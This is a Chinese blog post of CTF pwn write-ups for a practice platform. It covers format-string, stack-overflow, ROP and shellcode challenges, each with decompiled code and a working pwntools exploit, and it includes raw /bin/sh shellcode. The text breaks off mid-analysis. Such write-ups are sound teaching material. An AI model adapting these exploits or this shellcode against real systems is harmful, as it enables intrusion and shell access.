
<!DOCTYPE html>
<html lang="" class="loading">
<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>攻防世界pwn_writeup(持续更新) - 知世の小屋</title>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate">
    <meta name="keywords" content="知世,"> 
    <meta name="description" content="my blogs,
发现了一个新的练习pwn的平台,就记录一下刷题的过程吧

新手练习get_shell题目很简单,nc连上去直接’cat flag’就行了..

cgfsb代码分析下载题目拉进IDA里看一下1234,"> 
    <meta name="author" content="知世"> 
    <link rel="alternative" href="atom.xml" title="知世の小屋" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
    <link rel="stylesheet" href="/css/diaspora.css">
    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <script>
         (adsbygoogle = window.adsbygoogle || []).push({
              google_ad_client: "ca-pub-8691406134231910",
              enable_page_level_ads: true
         });
    </script>
    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
    </script>
</head>
</html>
<body class="loading">
    <span id="config-title" style="display:none">知世の小屋</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="icon-home image-icon" href="javascript:;" data-url="https://nightRainy.github.io"></a>
    <div title="播放/暂停" class="icon-play"></div>
    <h3 class="subtitle">攻防世界pwn_writeup(持续更新)</h3>
    <div class="social">
        <!--<div class="like-icon">-->
            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
        <!--</div>-->
        <div>
            <div class="share">
                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <div class="article">
    <div class="main">
        <h1 class="title">攻防世界pwn_writeup(持续更新)</h1>
        <div class="stuff">
            <span>三月 09, 2019</span>
            

        </div>
        <div class="content markdown">
            <blockquote>
<p>发现了一个新的练习pwn的平台,就记录一下刷题的过程吧</p>
</blockquote>
<h1 id="新手练习"><a href="#新手练习" class="headerlink" title="新手练习"></a>新手练习</h1><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><p>题目很简单,nc连上去直接’cat flag’就行了..</p>
<hr>
<h2 id="cgfsb"><a href="#cgfsb" class="headerlink" title="cgfsb"></a>cgfsb</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>下载题目拉进IDA里看一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax@4</span><br><span class="line">  int v4; // esi@4</span><br><span class="line">  int v5; // [sp+1Eh] [bp-7Eh]@1</span><br><span class="line">  int v6; // [sp+22h] [bp-7Ah]@1</span><br><span class="line">  __int16 v7; // [sp+26h] [bp-76h]@1</span><br><span class="line">  int v8; // [sp+28h] [bp-74h]@1</span><br><span class="line">  int v9; // [sp+8Ch] [bp-10h]@1</span><br><span class="line"></span><br><span class="line">  v9 = *MK_FP(__GS__, 20);</span><br><span class="line">  setbuf(stdin, 0);</span><br><span class="line">  setbuf(stdout, 0);</span><br><span class="line">  setbuf(stderr, 0);</span><br><span class="line">  v5 = 0;</span><br><span class="line">  v6 = 0;</span><br><span class="line">  v7 = 0;</span><br><span class="line">  memset(&amp;v8, 0, 0x64u);</span><br><span class="line">  puts(&quot;please tell me your name:&quot;);</span><br><span class="line">  read(0, &amp;v5, 0xAu);</span><br><span class="line">  puts(&quot;leave your message please:&quot;);</span><br><span class="line">  fgets((char *)&amp;v8, 100, stdin);</span><br><span class="line">  printf(&quot;hello %s&quot;, &amp;v5);</span><br><span class="line">  puts(&quot;your message is:&quot;);</span><br><span class="line">  printf((const char *)&amp;v8);</span><br><span class="line">  if ( pwnme == 8 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;you pwned me, here is your flag:\n&quot;);</span><br><span class="line">    system(&quot;cat flag&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Thank you!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  result = 0;</span><br><span class="line">  v4 = *MK_FP(__GS__, 20) ^ v9;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到明显的格式化字符串漏洞,可以造成任意地址写:<br>printf((const char * )&amp;v8)</p>
<h3 id="所用知识"><a href="#所用知识" class="headerlink" title="所用知识"></a>所用知识</h3><p>我们知道格式化漏洞中,我们可以通过%n将当前已打印字符的个数写入内存中<br>而%<n>$<fmt>指定其对应第n个参数,而通过gdb我们可以查看栈内存,那么题目结构就很明了了</fmt></n></p>
<h3 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>题目需要我们将pwnme变为8,那么我们查看一下pwnme的地址,然后测试一下v8在栈中的位置,最后通过格式化字符n写入即可<br>进入gdb调试,并在printf处下一个断点<br>分别输入111,aaaa,之后查看栈内存:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/16wx $esp</span><br><span class="line">0xffffc880:	0xffffc8a8	0xffffc89e	0xf7fab5c0	0xffffc8ec</span><br><span class="line">0xffffc890:	0xf7ffda9c	0x00000001	0xf7fcf410	0x31310001</span><br><span class="line">0xffffc8a0:	0x00000a31	0x00000000	0x61616161	0x0000000a</span><br><span class="line">0xffffc8b0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure></p>
<p>可以看到我们他在第10个参数的位置,因此借助之前我们所查看的pwnme的地址即:0x0804A068</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh=remote(&apos;111.198.29.45&apos;,30220)</span><br><span class="line">name=&apos;111&apos;</span><br><span class="line">pwnme=0x0804A068</span><br><span class="line"></span><br><span class="line">payload=p32(pwnme)+&apos;aaaa%10$n&apos;</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;please tell me your name:&quot;)</span><br><span class="line">sh.sendline(name)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&quot;leave your message please:&quot;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">print sh.recvall()</span><br></pre></td></tr></table></figure>
<p>打过去,成功cat flag</p>
<hr>
<h2 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when did you born:"></a>when did you born:</h2><h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>上手拉进IDA里看一下代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax@4</span><br><span class="line">  __int64 v4; // rd</span><br><span class="line">  char v5; // [sp+0h] [bp-20h]@5</span><br><span class="line">  unsigned int v6; // [sp+8h] [bp-18h]@1</span><br><span class="line">  __int64 v7; // [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v7 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">  puts(&quot;What&apos;s Your Birth?&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v6);</span><br><span class="line">  while ( getchar() != 10 )</span><br><span class="line">    ;</span><br><span class="line">  if ( v6 == 1926 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;You Cannot Born In 1926!&quot;);</span><br><span class="line">    result = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;What&apos;s Your Name?&quot;);</span><br><span class="line">    gets(&amp;v5);</span><br><span class="line">    printf(&quot;You Are Born In %d\n&quot;, v6);</span><br><span class="line">    if ( v6 == 1926 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;You Shall Have Flag.&quot;);</span><br><span class="line">      system(&quot;cat flag&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;You Are Naive.&quot;);</span><br><span class="line">      puts(&quot;You Speed One Second Here.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    result = 0LL;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = *MK_FP(__FS__, 40LL) ^ v7;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到程序想让我们年龄为1926,但是不能直接输入1926,但我们看到它使用了get函数,因此使用方法很明了了,就是栈溢出<br>并且我们可以看到v5位于’sp+0’而v6位于’sp+8’,因此我们构造长度直接溢出覆盖即可</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh=process(&apos;./when_did_you_born&apos;)</span><br><span class="line">sh=remote(&quot;111.198.29.45&quot;,30223)</span><br><span class="line"></span><br><span class="line">payload=&quot;a&quot;*(0x8)+p32(1926)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;Birth?&apos;)</span><br><span class="line">sh.sendline(&apos;1999&apos;)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&apos;Name?&apos;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">print sh.recvall()</span><br></pre></td></tr></table></figure>
<p>打过去即可</p>
<hr>
<h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p>这道题也是栈溢出..就直接写exp吧…</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./hello_pwn&apos;)</span><br><span class="line"></span><br><span class="line">sh = remote(&apos;111.198.29.45&apos;, 30225)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&apos;lets get&apos;, &apos;a&apos;*4 + p32(1853186401))</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><h3 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h3><p>题目代码逻辑很清晰,只需要使用一个简单的rop就可以完成<br>从代码里可以分析出变量里栈顶的距离,因此可以直接写exp</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh=process(&apos;./level0&apos;)</span><br><span class="line">sh=remote(&apos;111.198.29.45&apos;,30266)</span><br><span class="line">sys=0x040059A</span><br><span class="line"></span><br><span class="line">payload=&apos;a&apos;*0x80+&apos;xxxxxxxx&apos;+p64(sys)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><h3 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h3><p>也很简单,利用rop调用system函数就可以了,因为前面已经调用过system函数,因此plt表是已经绑定好了的,故而我们可以采用rop来将’/bin/sh’写入<br>而程序中用rabin2 -z level2也确实发现了’/bin/sh’,因此可以直接构造</p>
<h3 id="exp如下"><a href="#exp如下" class="headerlink" title="exp如下:"></a>exp如下:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh=process(&apos;./level2&apos;)</span><br><span class="line">#sh=remote(&apos;111.198.29.45&apos;,30278)</span><br><span class="line">elf=ELF(&apos;./level2&apos;)</span><br><span class="line">#sys=elf.symbols[&quot;system&quot;]</span><br><span class="line">#sys=0x0804a010</span><br><span class="line">sys=0x08048320</span><br><span class="line">bins=0x0804a024 </span><br><span class="line">payload=&quot;a&quot;*(0x88+4)+p32(sys)+&apos;xxxx&apos;+p32(bins)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p>这道题花了不少时间,有点强的</p>
<h3 id="代码分析-4"><a href="#代码分析-4" class="headerlink" title="代码分析"></a>代码分析</h3><ul>
<li>先看一下开的保护:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">   RELRO:    Full RELRO</span><br><span class="line">   Stack:    Canary found</span><br><span class="line">   NX:       NX enabled</span><br><span class="line">   PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>可以看到开了canary和堆栈不可执行</p>
<ul>
<li>main函数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // ST88_8@1</span><br><span class="line">  _DWORD *v4; // rax@1</span><br><span class="line">  __int64 v5; // ST18_8@1</span><br><span class="line">  __int64 result; // rax@1</span><br><span class="line">  __int64 v7; // rdx@1</span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  sub_400996();</span><br><span class="line">  v4 = malloc(8uLL);</span><br><span class="line">  v5 = (__int64)v4;</span><br><span class="line">  *v4 = 68;</span><br><span class="line">  v4[1] = 85;</span><br><span class="line">  puts(&quot;we are wizard, we will give you hand, you can not defeat dragon by yourself ...&quot;);</span><br><span class="line">  puts(&quot;we will tell you two secret ...&quot;);</span><br><span class="line">  printf(&quot;secret[0] is %x\n&quot;, v5, a2);</span><br><span class="line">  printf(&quot;secret[1] is %x\n&quot;, v5 + 4);</span><br><span class="line">  puts(&quot;do not tell anyone &quot;);</span><br><span class="line">  sub_400D72(v5);</span><br><span class="line">  puts(&quot;The End.....Really?&quot;);</span><br><span class="line">  result = 0LL;</span><br><span class="line">  v7 = *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>主函数输出了v4的地址</p>
<ul>
<li>sub_400BB9()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_400BB9()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [sp+4h] [bp-7Ch]@1</span><br><span class="line">  __int64 v2; // [sp+8h] [bp-78h]@1</span><br><span class="line">  char format; // [sp+10h] [bp-70h]@2</span><br><span class="line">  __int64 v4; // [sp+78h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v4 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  v2 = 0LL;</span><br><span class="line">  puts(&quot;You travel a short distance east.That&apos;s odd, anyone disappear suddenly&quot;);</span><br><span class="line">  puts(&quot;, what happend?! You just travel , and find another hole&quot;);</span><br><span class="line">  puts(&quot;You recall, a big black hole will suckk you into it! Know what should you do?&quot;);</span><br><span class="line">  puts(&quot;go into there(1), or leave(0)?:&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;A voice heard in your mind&quot;);</span><br><span class="line">    puts(&quot;&apos;Give me an address&apos;&quot;);</span><br><span class="line">    _isoc99_scanf(&quot;%ld&quot;, &amp;v2);</span><br><span class="line">    puts(&quot;And, you wish is:&quot;);</span><br><span class="line">    _isoc99_scanf(&quot;%s&quot;, &amp;format);</span><br><span class="line">    puts(&quot;Your wish is&quot;);</span><br><span class="line">    printf(&amp;format, &amp;format);</span><br><span class="line">    puts(&quot;I hear it, I hear it....&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到有一个格式化字符串的漏洞:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&amp;format,&amp;format);</span><br></pre></td></tr></table></figure></p>
<ul>
<li>sub_400CA6<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">_int64 __fastcall sub_400CA6(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  void *v1; // rsi@2</span><br><span class="line">  __int64 v3; // [sp+18h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  puts(&quot;Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!&quot;);</span><br><span class="line">  puts(&quot;Dragon say: HaHa! you were supposed to have a normal&quot;);</span><br><span class="line">  puts(&quot;RPG game, but I have changed it! you have no weapon and &quot;);</span><br><span class="line">  puts(&quot;skill! you could not defeat me !&quot;);</span><br><span class="line">  puts(&quot;That&apos;s sound terrible! you meet final boss!but you level is ONE!&quot;);</span><br><span class="line">  if ( *(_DWORD *)a1 == *(_DWORD *)(a1 + 4) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Wizard: I will help you! USE YOU SPELL&quot;);</span><br><span class="line">    v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);</span><br><span class="line">    read(0, v1, 0x100uLL);</span><br><span class="line">    ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__FS__, 40LL) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>可以看到在a1=a1[1]的时候,有一个指针的强制转化,因此我们可以把shellcode写入这个脆弱的指针中,而很幸运的事情是之前我们就输出了v4的地址,那么exp就很明了了:</p>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp:"></a>exp:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p = process(&quot;./string&quot;)</span><br><span class="line">p=remote(&apos;111.198.29.45&apos;,30292)</span><br><span class="line">p.recvuntil(&quot;secret[0] is &quot;) </span><br><span class="line">addr = int(p.recvuntil(&quot;\n&quot;)[:-1],16) </span><br><span class="line">log.success(&quot;addr:&quot;+hex(addr))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;be:\n&quot;,&quot;GG&quot;)</span><br><span class="line">p.sendlineafter(&quot;up?:\n&quot;,&quot;east&quot;)</span><br><span class="line">p.sendlineafter(&quot;leave(0)?:\n&quot;,&quot;1&quot;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;address\&apos;\n&quot;, str(addr))</span><br><span class="line">p.sendlineafter(&quot;is:\n&quot;, &quot;%85c%7$n&quot;)</span><br><span class="line">#shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode = &quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot; </span><br><span class="line">p.sendlineafter(&quot;SPELL\n&quot;,shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><h3 id="代码分析-5"><a href="#代码分析-5" class="headerlink" title="代码分析"></a>代码分析</h3><ul>
<li>main<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax@7</span><br><span class="line">  __int64 v4; // rsi@7</span><br><span class="line">  int v5; // [sp+4h] [bp-3Ch]@1</span><br><span class="line">  int i; // [sp+8h] [bp-38h]@1</span><br><span class="line">  int v7; // [sp+Ch] [bp-34h]@1</span><br><span class="line">  char v8; // [sp+10h] [bp-30h]@1</span><br><span class="line">  unsigned int seed[2]; // [sp+30h] [bp-10h]@1</span><br><span class="line">  __int64 v10; // [sp+38h] [bp-8h]@1</span><br><span class="line"></span><br><span class="line">  v10 = *MK_FP(__FS__, 40LL);</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">  v5 = 0;</span><br><span class="line">  v7 = 0;</span><br><span class="line">  *(_QWORD *)seed = sub_BB0();</span><br><span class="line">  puts(&quot;-------------------------------&quot;);</span><br><span class="line">  puts(&quot;Welcome to a guess number game!&quot;);</span><br><span class="line">  puts(&quot;-------------------------------&quot;);</span><br><span class="line">  puts(&quot;Please let me know your name!&quot;);</span><br><span class="line">  printf(&quot;Your name:&quot;, 0LL);</span><br><span class="line">  gets(&amp;v8);</span><br><span class="line">  srand(seed[0]);</span><br><span class="line">  for ( i = 0; i &lt;= 9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = rand() % 6 + 1;</span><br><span class="line">    printf(&quot;-------------Turn:%d-------------\n&quot;, (unsigned int)(i + 1));</span><br><span class="line">    printf(&quot;Please input your guess number:&quot;);</span><br><span class="line">    __isoc99_scanf(&quot;%d&quot;, &amp;v5);</span><br><span class="line">    puts(&quot;---------------------------------&quot;);</span><br><span class="line">    if ( v5 != v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;GG!&quot;);</span><br><span class="line">      exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Success!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E();</span><br><span class="line">  result = 0LL;</span><br><span class="line">  v4 = *MK_FP(__FS__, 40LL) ^ v10;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>可以看到题目有一个get(&amp;v8)的栈溢出漏洞,而通过覆盖下面的seed[0],可以做到制造伪随机数的效果</p>
